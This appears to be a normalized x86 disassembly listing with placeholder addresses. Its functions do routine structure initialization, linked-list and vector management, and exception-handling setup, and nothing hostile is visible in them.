lea ecx [ edi + 0x8 ]
mov [ edi ] r--data
call sub_40487c
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e093
push 0x0
mov eax sub_44a22d
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e0c3
push 0x0
mov eax sub_44a20a
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e0f3
push 0x0
mov eax sub_44a1e7
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e123
push 0x0
mov eax sub_44a1c4
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e153
push 0x0
mov eax sub_44a1a1
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e183
push 0x0
mov eax sub_44a17e
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e1b3
push 0x0
mov eax sub_44a15b
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e1e3
push 0x0
mov eax sub_44a138
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e213
push 0x0
mov eax sub_44a115
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e243
push 0x0
mov eax sub_44a0f2
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e273
push 0x0
mov eax sub_44a0cf
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e2a3
push 0x0
mov eax sub_44a0ac
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41e2d7
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx eax
mov eax [ ebx + 0x2c ]
mov ecx [ ebx + 0x48 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
lea ecx [ eax + ecx + 0x1 ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x20 ] eax
push esi
lea esi [ ebx + 0x30 ]
mov eax [ esi ]
mov [ edi + 0x2c ] eax
mov eax [ ebx + 0x48 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] eax
movzx eax [ r--data ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ edi + 0x30 ]
xor edx edx
push ecx
add eax 0x4
mov [ ebp - 0x14 ] dl
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] dl
call sub_41e901
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x4c ]
imul ecx ecx 0x18
add ebx 0x38
push ebx
push [ edi + 0x8 ]
add eax ecx
push eax
push [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax esi
mov esi [ ebp + 0x8 ]
call sub_41ea14
pop esi
pop ebx
leave
retn 0x4
sub_41e37f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e3af
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e3df
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e40f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e43f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e46f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e49f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e4cf
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e4ff
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e52f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e55f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e58f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e5bf
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e5ef
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e61f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e64f
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41e67c
push 0x6c
mov eax sub_44dace
call sub_4485fe
mov esi ecx
mov edi edx
cmp [ esi + 0x4 ] esi
jne r-xdata
call sub_41e8dc
add eax 0x34
cmp [ eax + 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x74 ]
push eax
call sub_41e76d
and [ ebp - 0x4 ] 0x0
push eax
call sub_41e84b
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x74 ]
push eax
call sub_41e7c6
jmp r-xdata
mov esi [ esi ]
push ecx
mov eax esp
mov [ ebp - 0x78 ] esp
push ecx
mov [ eax ] esi
mov eax esp
mov [ ebp - 0x78 ] esp
mov [ eax ] edi
call sub_41e89a
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov esi edi
call sub_41e8dc
call sub_448681
retn
sub_41e6f8
push esi
mov esi eax
cmp [ esi + 0x4 ] esi
jne r-xdata
call sub_41e8dc
add eax 0x34
cmp [ eax + 0x4 ] eax
je r-xdata
push 0x58
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ esi ]
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edi
call sub_41e89a
pop esi
retn
push eax
mov ecx edi
call sub_41e944
sub_41e76d
push 0x4
mov eax sub_44cf46
call sub_448595
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] bl
mov [ ebp - 0x4 ] ebx
mov [ edi + 0x14 ] bl
mov [ edi + 0x24 ] bl
lea eax [ edi + 0x34 ]
mov [ eax ] eax
mov [ eax + 0x4 ] eax
mov [ edi + 0x3c ] ebx
mov [ edi + 0x40 ] ebx
push ecx
mov [ ebp - 0x10 ] esp
lea esi [ edi + 0x44 ]
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x10 ] esp
call sub_41ef9a
mov [ edi + 0x54 ] ebx
mov [ edi + 0x58 ] ebx
mov [ edi + 0x5c ] ebx
mov eax edi
call sub_44866d
retn 0x4
sub_41e7c6
push 0x0
mov eax sub_44b7df
call sub_448595
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x54 ]
mov [ ebp - 0x4 ] 0x6
call sub_409b1b
lea eax [ edi + 0x44 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_41e9c5
mov [ ebp - 0x4 ] 0x4
mov eax [ edi + 0x40 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov esi [ edi + 0x3c ]
cmp esi ebx
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2fe
mov [ ebp - 0x4 ] 0x2
lea esi [ edi + 0x34 ]
jmp r-xdata
call sub_4219fb
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
cmp [ edi + 0x24 ] bl
je r-xdata
cmp [ edi + 0x14 ] bl
je r-xdata
mov [ edi + 0x24 ] bl
cmp [ edi + 0xc ] bl
je r-xdata
mov [ edi + 0x14 ] bl
call sub_44866d
retn 0x4
mov [ edi + 0xc ] bl
sub_41e84b
push 0x4
mov eax sub_44daa9
call sub_448595
push 0x6c
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov [ eax + 0x4 ] edi
mov ecx [ edi ]
mov [ eax ] ecx
mov ecx [ edi ]
mov [ ecx + 0x4 ] eax
mov [ edi ] eax
call sub_44866d
retn 0x4
push [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
call sub_41ec98
mov eax esi
sub_41e89a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
pop ebp
retn 0x8
sub_41e901
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41eafb
push [ ebp + 0xc ]
mov esi eax
push [ ebp + 0x8 ]
push esi
call sub_422e2d
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_41e944
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x4 ]
mov ebx ecx
jmp r-xdata
cmp esi edi
jne r-xdata
lea eax [ esi + 0x3c ]
cmp [ eax + 0x4 ] eax
je r-xdata
push ecx
mov eax esp
mov [ eax ] ebx
mov eax edi
call sub_41ea78
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ esi + 0x4 ]
push eax
mov ecx ebx
call sub_41e944
sub_41e9ad
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_41ef9a
mov eax esi
pop esi
leave
retn
sub_41e9c5
push 0x4
mov eax sub_44a089
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_41ef4b
or [ ebp - 0x4 ] 0xffffffff
push [ edi + 0x4 ]
call sub_424fc7
pop ecx
call sub_44866d
retn 0x4
sub_41ea14
push ebp
mov ebp esp
push edi
lea edi [ esi + 0x40 ]
call sub_41eb88
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
lea ecx [ esi + 0x54 ]
call sub_41ebad
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
pop edi
pop ebp
retn 0x10
sub_41ea78
push ebp
mov ebp esp
cmp [ eax + 0x4 ] eax
je r-xdata
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov ecx [ eax + 0x4 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov [ eax + 0x4 ] eax
mov [ eax ] eax
sub_41eac5
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov [ eax ] ecx
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x8 ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ eax + 0xc ] ecx
retn
sub_41eafb
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
imul ecx ecx 0x18
push edi
mov edi eax
mov eax [ edi + 0x8 ]
add ecx eax
mov [ edi + 0x8 ] ecx
cmp [ edi + 0xc ] ecx
jae r-xdata
pop edi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov [ edi + 0x8 ] eax
push [ ebp + 0x8 ]
call sub_41edee
sub_41eb4e
push ebp
mov ebp esp
push ecx
push esi
push ecx
mov [ ebp - 0x4 ] esp
mov esi eax
mov [ ebp - 0x4 ] esp
call sub_41ef9a
mov eax esi
pop esi
leave
retn
sub_41eb66
push ebp
mov ebp esp
push ecx
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push esi
push ecx
push edx
lea esi [ ebp - 0x4 ]
call sub_41ef4b
pop esi
leave
retn
sub_41eb88
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ edi ] eax
test ecx ecx
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov eax edi
retn
push esi
lea esi [ ecx + 0x4 ]
call sub_40c2fe
pop esi
sub_41ebad
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi eax
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
leave
retn
mov ecx [ edi + 0x4 ]
push ebx
mov ebx ecx
sub ebx [ edi ]
sar ebx 0x5
test ebx ebx
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esi ]
sub edx eax
sar edx 0x5
cmp ebx edx
ja r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
push ecx
lea eax [ ebp - 0x4 ]
push eax
call sub_40eee3
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
sar ecx 0x5
cmp ebx ecx
ja r-xdata
push [ ebp - 0x4 ]
push ecx
mov ecx [ edi ]
call sub_422e6a
push [ esi + 0x4 ]
call sub_40b740
mov eax [ edi + 0x4 ]
sub eax [ edi ]
add esp 0xc
and eax 0xffffffe0
add eax [ esi ]
jmp r-xdata
pop ebx
test eax eax
je r-xdata
mov ecx [ edi ]
push [ ebp - 0x4 ]
shl edx 0x5
lea ebx [ ecx + edx ]
push ebx
call sub_422e6a
push [ ebp - 0x4 ]
mov eax [ esi + 0x4 ]
mov edi [ edi + 0x4 ]
push eax
push edi
mov ecx ebx
call sub_4234eb
add esp 0x14
jmp r-xdata
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x4 ]
sub eax [ edi ]
sar eax 0x5
call sub_409ad8
test al al
je r-xdata
push [ esi + 0x4 ]
call sub_40b740
push [ esi ]
call sub_424fc7
pop ecx
pop ecx
push [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push eax
push edx
call sub_4234eb
add esp 0xc
sub_41ec98
push 0x3c
mov eax sub_44da84
call sub_448595
mov ebx [ ebp + 0xc ]
mov eax [ ebx ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
lea eax [ esi + 0x4 ]
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x18 ] eax
lea eax [ esi + 0xc ]
mov [ ebp - 0x20 ] eax
mov [ eax ] cl
lea eax [ esi + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x24 ] eax
mov [ eax ] cl
lea eax [ esi + 0x24 ]
mov [ ebp - 0x28 ] eax
mov [ eax ] cl
lea eax [ esi + 0x34 ]
mov [ ebp - 0x2c ] eax
mov [ eax ] eax
mov [ eax + 0x4 ] eax
mov [ esi + 0x3c ] ecx
lea eax [ esi + 0x40 ]
mov [ ebp - 0x30 ] eax
mov [ eax ] ecx
lea ecx [ ebx + 0x44 ]
lea eax [ esi + 0x44 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x5
call sub_41f1b2
lea eax [ esi + 0x54 ]
lea ecx [ ebx + 0x54 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_408ed8
mov ecx ebx
mov [ ebp - 0x4 ] 0x7
call sub_41efe8
cmp eax 0xffffffff
je r-xdata
mov eax esi
call sub_44866d
retn 0x8
mov eax esi
call sub_41f002
lea edi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
add ebx 0xc
mov esi ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1c ] ebx
call sub_41f517
mov eax [ eax ]
mov ebx [ ebp - 0x10 ]
and [ ebp - 0x3c ] 0x0
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x38 ] eax
movzx eax [ r--data ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push ebx
add eax 0x4
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x34 ] 0x0
call sub_41e901
mov esi edi
mov edi [ ebp - 0x18 ]
push eax
call sub_41f4d6
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41f537
mov esi [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea eax [ esi + 0x14 ]
call sub_41f567
mov edx [ ebp - 0x28 ]
lea eax [ esi + 0x24 ]
call sub_41f567
mov ecx [ ebp - 0x2c ]
lea eax [ esi + 0x34 ]
push eax
call sub_41f08e
mov edi [ ebp - 0x30 ]
lea eax [ esi + 0x40 ]
call sub_41eb88
mov esi [ ebp + 0x8 ]
sub_41edee
push 0x4
mov eax sub_449ece
call sub_448595
mov ebx [ ebp + 0x8 ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax 0x100
mov [ ebp - 0x10 ] eax
cmp ebx eax
lea eax [ ebp - 0x10 ]
jb r-xdata
mov ecx [ edi + 0x8 ]
mov [ eax + 0x4 ] ecx
mov esi [ edi ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov esi [ eax ]
push 0x14
call sub_424ff8
pop ecx
mov [ ebp + 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
sub eax [ esi ]
push 0x18
cdq
pop ecx
idiv ecx
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
test eax eax
jns r-xdata
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
push 0x18
cdq
pop ebx
idiv ebx
mov ebx [ ebp + 0x8 ]
cmp ebx eax
ja r-xdata
mov [ edi ] eax
mov eax [ eax ]
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ edi + 0x8 ] eax
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ edi + 0xc ] eax
push eax
fmul [ r--data ]
call sub_449cf6
mov [ ebp - 0x10 ] eax
cmp ebx eax
lea eax [ ebp - 0x10 ]
jb r-xdata
fadd [ r--data ]
push [ ebp + 0xc ]
mov eax ebx
imul eax eax 0x18
mov [ edi ] ecx
add eax [ ecx ]
push ebx
mov [ ecx + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ edi + 0xc ] eax
mov eax [ edi ]
mov eax [ eax ]
push eax
mov [ edi + 0x4 ] eax
call sub_422e2d
add esp 0xc
jmp r-xdata
mov esi [ eax ]
push 0x14
call sub_424ff8
pop ecx
mov [ ebp + 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
call sub_44866d
retn 0x8
mov eax [ edi ]
push [ eax + 0x10 ]
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx esi
mov esi [ ebp + 0x8 ]
mov eax ebx
call sub_41f110
sub_41ef4b
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov ecx [ edi + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ecx ]
jne r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
mov [ esi ] eax
mov eax esi
pop edi
leave
retn 0x8
push ebx
call sub_41f45a
mov eax [ edi + 0x4 ]
mov eax [ eax ]
jmp r-xdata
mov ebx eax
lea eax [ ebp + 0x8 ]
call sub_41fa8c
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
call sub_41f205
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
pop ebx
sub_41ef9a
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
call sub_420eab
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x15 ] 0x1
mov eax esi
retn 0x4
sub_41f002
push ebx
push esi
lea esi [ eax + 0x3c ]
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
call sub_41f640
pop esi
pop ebx
retn
push 0x1c
call sub_424ff8
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
lea ecx [ eax + 0x14 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
mov [ ecx ] ecx
mov [ ecx + 0x4 ] ecx
jmp r-xdata
push edi
mov edi esi
call sub_41f621
pop edi
sub_41f08e
push 0x8
mov eax sub_44da0f
call sub_448595
mov esi ecx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_41f599
and [ ebp - 0x4 ] 0x0
mov edi eax
call sub_41f5c7
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x14 ]
cmp [ ebp - 0x10 ] eax
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_41f0d2
mov eax esi
call sub_44866d
retn 0x4
sub_41f0d2
push esi
mov esi ecx
push edi
cmp [ esi + 0x4 ] esi
jne r-xdata
mov edi [ esi + 0x4 ]
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov [ eax ] esi
lea eax [ edi + 0x8 ]
push eax
call sub_41e7c6
push edi
call sub_424fc7
pop ecx
pop edi
pop esi
retn
push 0x8b
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41f110
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0x8 ]
mov edi ecx
mov ebx eax
mov eax edi
call sub_41f66b
imul edi edi 0x18
imul ebx ebx 0x18
add edi eax
add ebx eax
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] edi
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ecx
pop ebx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov [ eax + 0x10 ] esi
mov eax esi
pop ebp
retn 0xc
mov [ eax + 0xc ] esi
sub_41f1b2
push 0x8
mov eax sub_44abe8
call sub_4485c8
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x14 ] esp
call sub_41ef9a
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0xc ]
mov ecx esi
call sub_41f716
mov eax esi
call sub_44866d
retn 0x8
sub_41f205
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
cmp [ ebx + 0x15 ] 0x0
push esi
push edi
je r-xdata
lea eax [ ebp + 0x10 ]
call sub_41fa8c
mov edx [ ebx ]
